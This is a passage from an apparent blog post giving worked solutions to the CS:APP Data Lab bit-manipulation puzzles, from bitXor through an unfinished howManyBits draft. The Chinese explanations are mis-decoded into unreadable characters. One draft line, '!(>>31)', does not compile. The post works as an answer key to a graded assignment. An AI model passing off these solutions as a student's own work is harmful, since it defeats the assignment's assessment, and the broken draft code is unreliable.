é˜»ã€‚</p><p>ç”¨ç»™å®šçš„è¿ç®—ç¬¦å®ç°å‡½æ•°çš„åŠŸèƒ½ï¼Œè§£å‹å¾—åˆ°æºç ä¹‹ååœ¨ <code>bits.c</code> ä¸­ç¼–å†™è‡ªå·±çš„ä»£ç ï¼Œç„¶åè¦æŸ¥çœ‹ç»“æœå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$make</span><br><span class="line">$./btest</span><br></pre></td></tr></table></figure><p>å®éªŒè§„å®šå¹¶éå¼ºåˆ¶ï¼Œä½†æ˜¯æƒ³è·å¾—æå‡è¿˜æ˜¯ä¸¥æ ¼éµå®ˆå®ƒç»™å®šçš„æ¡ä»¶ã€‚</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªå…è®¸ä½¿ç”¨ä½è¿ç®— <code>~</code> å’Œ <code>&amp;</code> å®ç°æŒ‰ä½å¼‚æˆ–ï¼Œè¿™ä¸ªæˆ‘ä»¬åœ¨ä¸Šé¢æœ‰å†™è¿‡ï¼Œåªä¸è¿‡æ²¡æœ‰åˆåœ¨ä¸€èµ·ï¼Œç¨å¾®è½¬æ¢ä¸€ä¸‹å³å¯ï¼Œåæ­£å®ç°çš„æ€æƒ³å°±æ˜¯è¦ä½ä¹‹é—´ä¸ä¸€æ ·æ‰è¿”å› <code>1</code>ã€‚</p><h4 id="ç­”æ¡ˆ"><a href="#ç­”æ¡ˆ" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å¾—æ•´æ•°çš„æœ€å°å€¼ï¼Œæœ€å°å€¼å°±æ˜¯æˆ‘ä»¬å–œé—»ä¹è§çš„ <code>-2147483648</code> å•¦ï¼Œä½†æ˜¯æˆ‘ä»¬ç¨å¾®è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œæœ€å°å°±æ˜¯æœ€é«˜ä½ä¸€ä¸ª0ï¼Œç”¨ä¸ª <code>1</code>ï¼Œç„¶åç§»ä½è¿ç®—æŠŠå®ƒç§»åˆ°æœ€é«˜ä½å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-1"><a href="#ç­”æ¡ˆ-1" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ <code>x</code> æ˜¯å¦ä¸ºæœ€å¤§å€¼ï¼Œæœ€å¤§å€¼åº”è¯¥æ˜¯æœ€å°å€¼å–åï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸€æ ·æˆ‘ä»¬ä½¿ç”¨å¼‚æˆ–è¿ç®—ï¼Œå¼‚æˆ–åªæœ‰åœ¨ä¸¤è¾¹ç›¸ç­‰æ—¶æ‰è¿”å› <code>0</code>ï¼Œæˆ‘ä»¬ç”¨éè¿ç®—ç¬¦åä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><h4 id="ç­”æ¡ˆ-2"><a href="#ç­”æ¡ˆ-2" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))^x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ <code>x</code> æ˜¯å¦å¥‡æ•°ä½ä¸Šå…¨ä¸º <code>1</code>ã€‚å…¨ <code>1</code> æˆ‘ä»¬ç›´æ¥ç”¨ä¸€ä¸ªç«‹å³æ•°å¥½äº† <code>0xAAAAAAAA</code>ï¼Œç„¶åä¸å±è”½å¶æ•°ä½ä¹‹ååˆ¤æ–­æ˜¯å¦ç›¸ç­‰å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-3"><a href="#ç­”æ¡ˆ-3" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="number">0xAAAAAAAA</span>&amp;x)^<span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°å¯¹ä¸€ä¸ªæ•°å–è´Ÿï¼Œå–è´Ÿçš„è¯å°±æ˜¯å–åå†åŠ ä¸€å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦åœ¨ <code>ASCII</code> ç çš„æ•°å­—ä½ç½®ï¼Œå†è½¬æ¢ä¸€ä¸‹å°±æ˜¯æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="number">-0x30</span>&gt;=<span class="number">0</span>  &amp;&amp; x<span class="number">-0x3a</span>&lt;<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åˆ¤æ–­ <code>x-0x30</code> æ˜¯å¦ä¸ºéè´Ÿæ•°ï¼Œ<code>x-0x3a</code> æ˜¯å¦ä¸ºè´Ÿæ•°ï¼Œä¹Ÿè®¸éœ€è¦è€ƒè™‘æº¢å‡ºï¼Œä½†æ˜¯ç»“æœå‘ç°ä¸éœ€è¦ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯ä¸¤è¾¹åˆ¤æ–­çš„ã€‚</p><h4 id="ç­”æ¡ˆ-4"><a href="#ç­”æ¡ˆ-4" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="comment">//x-0x30&gt;=0  &amp;&amp; x-0x3a&lt;0</span></span><br><span class="line"><span class="keyword">return</span> !((x+(~<span class="number">0x30</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&amp;!!((x+(~<span class="number">0x3a</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå®ç°è¿ç®— <code>x?y:z</code>ï¼Œå¦‚æœ <code>x</code> ä¸º <code>0</code> åˆ™è¿”å› <code>x</code>ï¼Œå¦‚æœä¸ä¸º <code>0</code> åˆ™è¿”å› <code>y</code>ã€‚</p><p>æˆ‘ä»¬å…ˆæŠŠ <code>x</code>å–å€¼å˜ä¸ºåªæœ‰ <code>0</code> å’Œ <code>-1</code>ã€‚ç”¨æ©ç çš„æ€è·¯ï¼Œå¦‚è¿‡ç»“æœä¸º <code>-1</code> åˆ™è¯´æ˜ä½æ¨¡å¼å…¨ä¸º <code>1</code>ï¼Œç›¸ä¸çš„ç»“æœå°±æ˜¯å¦ä¸€ä¸ªæ•°æœ¬èº«ï¼Œå¦‚æœæ˜¯ <code>0</code> åˆ™ä¸è®ºä¸è°ç»“æœéƒ½æ˜¯ <code>0</code>ï¼Œæˆ‘ä»¬è®© <code>x</code> ä¸ <code>y</code>ï¼Œè®© <code>~x</code> ä¸ <code>z</code>ï¼Œæœ€åå¾—åˆ°çš„ä¸¤ä¸ªå€¼æˆ–èµ·æ¥å³å¯ã€‚<code>x</code> å¦‚æœæ˜¯ <code>-1</code> åˆ™è¿”å› <code>y</code> ï¼Œå¦‚æœæ˜¯ <code>0</code> åˆ™è¿”å› <code>z</code>ã€‚å¾—åˆ° <code>x</code> æˆ‘ä»¬åªè¦éä¸¤æ¬¡ï¼Œå†å–è´Ÿå³å¯ï¼Œå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„è¦æ±‚äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x=~(!!x)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°ä¸€ä¸ªå°äºç­‰äºçš„åŠŸèƒ½ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½ç›´æ¥ç›¸å‡ï¼Œä¼šæœ‰æº¢å‡ºã€‚</p><p>å› æ­¤æˆ‘ä»¬é€‰æ‹©å…ˆåˆ¤æ–­ç¬¦å·ä½ï¼Œç¬¦å·ä½ä¸€è‡´å†ç›¸å‡ä¸€å®šä¸ä¼šæº¢å‡ºï¼Œç¬¦å·ä¸ä¸€è‡´åˆ™å¼ºè¡Œè¿”å›ä¸ä¸€è‡´çš„ç»“æœï¼Œä¸€è‡´åˆ™è¿”å›ç›´æ¥ç›¸å‡çš„ç»“æœã€‚é¦–å…ˆæˆ‘ä»¬å…ˆæ‹¿ä¸¤ä¸ªå˜é‡ä¿å­˜ç¬¦å·çš„ç»“æœï¼Œç„¶åå†åˆ¤æ–­ç¬¦å·æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™å±è”½ç¬¦å·çš„ç»“æœï¼Œä¸ä¸€è‡´åˆ™å±è”½ç›¸å‡çš„ç»“æœã€‚</p><p>è¿™é‡Œå¥½å¥½å†ç†è§£ä¸€ä¸‹ï¼Œä»”ç»†çœ‹ <code>signx^signy</code> å’Œ <code>!(signx^signy)</code> å¦‚ä½•èµ·åˆ°å±è”½ç­”æ¡ˆçš„æ•ˆæœã€‚</p><h4 id="ç­”æ¡ˆ-5"><a href="#ç­”æ¡ˆ-5" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;<span class="comment">//y-x&gt;=0</span></span><br><span class="line">    <span class="keyword">int</span> signx=!(x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> signy=!(y&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> sign=(signx^signy)&amp;signy;<span class="comment">//è‹¥ä¸ä¸€è‡´åˆ™è¿”å›yæ˜¯å¦ä¸ºéè´Ÿæ•°</span></span><br><span class="line">    x=x&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    y=y&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> sign|(!(((y+(~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))))&amp;(!(signx^signy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°é€»è¾‘éçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦ç ”ç©¶ä¸€ä¸‹ <code>0</code> çš„ç‰¹æ€§ï¼Œ<code>0</code> æ˜¯é™¤äº† <code>TMIN</code> ä»¥å¤–çš„è´Ÿæ•°å€¼ç­‰äºè‡ªå·±æœ¬èº«çš„æ•°äº†ã€‚ç„¶åå†åˆ¤æ–­ä¸€ä¸‹æœ€é«˜ä½å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-6"><a href="#ç­”æ¡ˆ-6" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æŒºéš¾çš„ï¼Œé¦–å…ˆè¦æƒ³åˆ°ä¸€ä¸ªäºŒåˆ†ï¼Œç„¶åè¦æ³¨æ„æ­£æ•°éœ€è¦å¤šä¸€ä½ï¼Œè´Ÿæ•°ä¸éœ€è¦ã€‚å‡å¦‚æˆ‘ç»™äº†ä½  <code>0x7fffffff</code>ï¼Œé‚£ä¹ˆä½ è‚¯å®šè¦ <code>32</code> ä½ï¼Œè™½ç„¶æˆ‘åªæœ‰ <code>31</code> ä½æœ‰æ•ˆæ•°å­—ã€‚æˆ‘ç»™ä½ ä¸ª <code>-1</code> é‚£ä¸€ä½å°±å¤Ÿäº†ï¼Œå› ä¸ºä¸€ä½çš„èŒƒå›´å°±æ˜¯ <code>-1~0</code>ã€‚</p><p>æˆ‘ä»¬å…ˆåˆ¤æ–­é«˜ <code>16</code> ä½æ˜¯å¦æœ‰ <code>1</code>ï¼Œè‹¥æœ‰åˆ™åˆ¤æ–­é«˜ <code>16</code> ä½ï¼Œç­”æ¡ˆåŠ ä¸Š <code>16</code>ï¼Œå¦åˆ™åˆ¤æ–­ä½ <code>16</code> ä½ã€‚</p><p>å†åˆ¤æ–­çš„ <code>16</code> ä½ä¸­ï¼Œåˆ¤æ–­é«˜ <code>8</code> ä½æ˜¯å¦æœ‰ <code>1</code>ï¼Œè‹¥æœ‰åˆ™ç»§ç»­åˆ¤æ–­é«˜ <code>8</code> ä½ï¼Œç­”æ¡ˆåŠ ä¸Š<code>8</code>ï¼Œå¦åˆ™åˆ¤æ–­ä½ <code>8</code> ä½ã€‚</p><p>ç›´åˆ°åˆ¤å®Œã€‚æˆ‘ä¸€å¼€å§‹æƒ³åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=!(&gt;&gt;<span class="number">31</span>); </span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span 